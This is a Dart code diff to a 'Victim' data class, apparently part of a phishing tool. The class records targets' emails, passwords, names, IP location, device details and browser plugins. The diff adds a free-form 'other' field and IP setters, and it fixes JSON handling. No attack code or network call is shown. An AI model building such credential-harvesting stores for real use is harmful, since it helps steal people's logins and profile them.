@@ -19,6 +19,7 @@ class Victim {
   String deviceDetails = "";
   IpDetails ipDetails = IpDetails("", "", "");
   String browserplugins = "";
+  String otherInfo = "";
   bool isVictim = false;
   late VictimState state;
 
@@ -27,7 +28,7 @@ class Victim {
     state = VictimState.target;
   }
 
-  Victim.fromMemory(this.email, this.password, this.name, this.ipDetails, this.browserplugins, this.isVictim, this.deviceDetails, this.ident, this.state);
+  Victim.fromMemory(this.email, this.password, this.name, this.ipDetails, this.browserplugins, this.isVictim, this.deviceDetails, this.ident, this.state, this.otherInfo);
 
   void setPassword(String password) {
     this.password = password;
@@ -50,16 +51,21 @@ class Victim {
     this.state = state;
   }
 
+  void setOtherInfo(String otherInfo) {
+    this.otherInfo = otherInfo;
+  }
+
   static Victim fromJson(Map<String, dynamic> json) => Victim.fromMemory(
         json['email'] as String,
         json['password'] as String,
         json['name'] as String,
-        json['ipDetails'] as IpDetails,
+        IpDetails.fromJson(json['ipDetails']),
         json['browserplugins'] as String,
         json['isVictim'] as bool,
         json['deviceDetails'] as String,
         json['ident'] as int,
         VictimState.values[json['state'] as int],
+        json['other'] as String,
       );
 
   Map<String, dynamic> toJson() => {
@@ -72,6 +78,7 @@ class Victim {
         'deviceDetails': deviceDetails,
         'ident': ident,
         'state': state.index,
+        'other': otherInfo,
       };
 }
 
@@ -81,6 +88,23 @@ class IpDetails {
   String city;
 
   IpDetails(this.ip, this.country, this.city);
+
+  void setIp(String ip) {
+    this.ip = ip;
+  }
+
+  void setCountry(String country) {
+    this.country = country;
+  }
+
+  void setCity(String city) {
+    this.city = city;
+  }
+
+  @override
+  String toString() {
+    return "IP: $ip, Country: $country, City: $city";
+  }
 
   static IpDetails fromJson(Map<String, dynamic> json) => IpDetails(
         json['ip'] as String,
